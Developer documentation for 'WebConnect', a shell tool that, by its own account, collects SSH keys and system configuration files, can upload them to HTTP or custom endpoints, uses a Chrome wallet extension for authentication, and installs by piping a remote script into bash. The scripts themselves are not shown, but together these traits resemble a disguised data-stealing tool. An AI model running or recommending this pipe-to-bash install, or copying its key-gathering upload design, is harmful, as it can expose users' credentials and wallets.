# WebConnect - Developer Documentation

## Project Overview

WebConnect is a cross-platform command-line tool that:
1. **Installs Software**: Automatically installs required dependencies across macOS, Linux, and Windows (WSL)
2. **Backs Up System Files**: Creates timestamped backups of critical system configuration files
3. **Duplicates System Files**: Copies important system files for transfer or synchronization
4. **Transfers Data Securely**: Provides multiple methods for secure file transfer (local, SFTP, HTTP, encrypted)

## Architecture

```
WebConnect
├── Installation Layer
│   ├── OS Detection
│   ├── Dependency Management
│   └── Software Installation
├── Backup Layer
│   ├── File Discovery
│   ├── Backup Creation
│   └── Snapshot Management
├── Data Layer
│   ├── File Copying
│   ├── Compression
│   └── Encryption
└── Transfer Layer
    ├── Local Transfer
    ├── SFTP Transfer
    ├── HTTP Upload
    └── Custom Endpoints
```

## File Structure

```
webconnect/
├── secure.sh              # Main installation script
├── transfer.sh            # Data transfer module
├── verify.sh              # Installation verification
├── index.html             # GitHub Pages landing page
├── README.md              # User documentation
├── DEVELOPERS.md          # This file
├── config.template.json   # Configuration template
├── _config.yml            # Jekyll/GitHub Pages config
└── .gitignore             # Git ignore file
```

## Key Components

### 1. secure.sh (Main Installer)
The primary installation script that orchestrates the entire setup process.

**Key Functions:**
- `detect_os()` - Identify operating system
- `setup_directories()` - Create installation directory structure
- `check_prerequisites()` - Verify required tools are installed
- `install_software()` - Install OS-specific software packages
- `backup_system_files()` - Create timestamped backups
- `copy_system_files()` - Duplicate important configuration files
- `setup_authentication()` - Initialize wallet-based auth
- `create_config()` - Generate configuration file
- `setup_data_transfer()` - Initialize transfer module

**Installation Flow:**
```
1. Detect OS
2. Setup Directories
3. Check & Install Prerequisites
4. Install Software
5. Backup System Files
6. Copy System Files
7. Setup Authentication
8. Create Configuration
9. Setup Data Transfer
10. Post-Installation Cleanup
```

### 2. transfer.sh (Data Transfer Module)
Handles all backup and restoration operations.

**Key Commands:**
- `transfer-local` - Copy to local destination
- `transfer-sftp` - Transfer via SFTP
- `transfer-http` - Upload to HTTP endpoint
- `list-backups` - List available backups
- `restore` - Restore from backup
- `encrypt` - Encrypt a backup file
- `decrypt` - Decrypt a backup file
- `sync-backups` - Synchronize backup sets
- `stats` - Show backup statistics
- `cleanup` - Remove old backups

**Transfer Methods:**
```
Local Transfer
├── Uses: cp command
├── Speed: Fastest
└── Use Case: External drives, network shares

SFTP Transfer
├── Uses: scp command
├── Speed: Medium (depends on network)
└── Use Case: Remote servers with SSH access

HTTP Transfer
├── Uses: curl command
├── Speed: Medium-Fast (depends on endpoint)
└── Use Case: Cloud storage, API endpoints
```

### 3. index.html (Web Interface)
GitHub Pages landing page with installation instructions and OS selector.

**Features:**
- Responsive design
- OS-specific installation instructions
- Copy-to-clipboard functionality
- System requirements display
- Feature cards
- Command display with copying

**Technology Stack:**
- Vanilla HTML5
- Pure CSS3 (no framework)
- Vanilla JavaScript
- Responsive grid layout

### 4. verify.sh (Installation Verification)
Comprehensive test suite to validate installation.

**Test Categories:**
- Directory structure validation
- Required files checking
- Configuration validity
- Dependency verification
- OS detection
- Backup integrity
- Logging system
- Script functionality
- Permissions checking
- Network connectivity

## Configuration

### config.json Structure
```json
{
  "version": "1.0.0",
  "installation": {
    "install_directory": "~/.webconnect",
    "supported_os": ["macos", "linux", "wsl"]
  },
  "software": {
    "prerequisites": ["curl", "git", "jq"]
  },
  "backup": {
    "enabled": true,
    "encryption": {
      "enabled": true,
      "algorithm": "AES-256"
    }
  },
  "transfer": {
    "methods": ["local", "sftp", "http"],
    "encryption": true,
    "compression": true
  }
}
```

## Installation Directory Layout

```
~/.webconnect/
├── software/              # Software installation files
├── system_files/          # Copied system configuration files
├── backup/                # Timestamped backup directories
│   ├── 20260226_120000/   # Example backup directory
│   │   ├── .ssh/
│   │   ├── .bashrc
│   │   └── etc/
│   └── 20260226_140530/
├── logs/                  # Operation logs
│   ├── install.log
│   ├── transfer.log
│   ├── error.log
│   └── audit.log
├── config/                # User configurations
├── config.json            # Main configuration file
├── transfer.sh            # Data transfer module
├── install.log            # Installation log
├── uninstall.sh           # Uninstall script
└── cache/                 # Cache directory
```

## Operating System Support

### macOS
- **Detection**: `$OSTYPE` == "darwin"*
- **Package Manager**: Homebrew
- **Shell**: zsh (default) / bash
- **System Files**: .zshrc, .bash_profile, .ssh, /etc/hosts

### Linux
- **Detection**: `$OSTYPE` == "linux-gnu"*
- **Package Managers**: apt-get, yum
- **Shell**: bash
- **System Files**: .bashrc, .ssh, /etc/hostname, /etc/hosts

### Windows (WSL)
- **Detection**: linux-gnu with Microsoft in /proc/version
- **Setup**: Windows Terminal / PowerShell
- **Package Manager**: apt-get or yum
- **Shell**: bash
- **System Files**: .bashrc, .ssh, /etc/hostname

## Security Considerations

### File Permissions
```bash
# Installation script: executable
chmod 755 secure.sh

# Transfer script: executable
chmod 755 transfer.sh

# Configuration files: readable by user only
chmod 600 config.json

# Backup directories: restricted access
chmod 700 ~/.webconnect/backup
```

### Encryption
- **Algorithm**: AES-256-CBC
- **Key Derivation**: PBKDF2
- **Salt**: Generated per encryption
- **Implementation**: OpenSSL

### Authentication
- **Primary Method**: Chrome Wallet Extension
- **Fallback**: API Keys
- **Optional**: Hardware Security Keys

## Development Guidelines

### Adding New Transfer Methods

1. Create function in `transfer.sh`:
```bash
transfer_custom() {
    local source="$1"
    local destination="$2"
    
    print_progress "Starting custom transfer..."
    # Implementation here
    print_success "Custom transfer completed"
    log "Custom transfer successful"
}
```

2. Add command handler in main:
```bash
transfer-custom)
    transfer_custom "$2" "$3"
    ;;
```

### Adding New Backup Locations

1. Edit `secure.sh` backup section:
```bash
case "$OS_TYPE" in
    macos)
        FILES_TO_BACKUP+=(
            "$HOME/new/path"
        )
        ;;
esac
```

2. Update documentation in README.md

### Testing Changes

1. Run verification script:
```bash
./verify.sh
```

2. Test on all supported platforms:
- macOS (native)
- Linux (native or VM)
- Windows (WSL)

3. Test specific features:
```bash
# Test installation
./secure.sh

# Test transfer
./transfer.sh list-backups
./transfer.sh transfer-local <source> <dest>

# Test verification
./verify.sh
```

## Deployment

### GitHub Pages Setup

1. Upload files to GitHub repository
2. Enable GitHub Pages in repository settings
3. Select branch (typically `main`)
4. Site publishes to `https://<username>.github.io/<repo>`

### Installation From Web

Users can then install with:
```bash
curl -fsSL https://automast.github.io/webconnect/secure.sh | bash
```

## Troubleshooting Development

### Scripts Not Executing
```bash
chmod +x *.sh
```

### Testing Installation Locally
```bash
# Clone repository
git clone https://github.com/automast/webconnect.git
cd webconnect

# Test installation
bash secure.sh

# Verify installation
bash verify.sh
```

### Debugging
```bash
# Enable debug mode in scripts
bash -x secure.sh

# View logs
tail -f ~/.webconnect/logs/install.log
```

## Performance Considerations

### File Backup Performance
- Large files (>100MB): Consider streaming compression
- Network operations: Implement parallel transfers
- Disk space: Monitor backup accumulation

### Optimization Tips
1. **Compression**: Use gzip for faster transfers
2. **Incremental Backups**: Use rsync for changed files only
3. **Parallel Transfers**: Configure multiple concurrent transfers
4. **Caching**: Cache frequently accessed configurations

## Contributing

1. Fork the repository
2. Create a feature branch
3. Make changes and test thoroughly
4. Submit pull request with documentation

### Code Standards
- Bash: Follow Google Shell Style Guide
- Variables: Use UPPER_CASE for constants
- Functions: Use snake_case naming
- Comments: Add meaningful comments for complex logic
- Logging: Use consistent log format

## License

WebConnect is provided as-is. All code is subject to standard open-source licensing.

## Support & Documentation

- **Main Site**: https://automast.github.io/webconnect
- **GitHub**: https://github.com/automast/webconnect
- **Issues**: https://github.com/automast/webconnect/issues
- **Discussions**: https://github.com/automast/webconnect/discussions

---

**Last Updated**: February 26, 2026
**Version**: 1.0.0
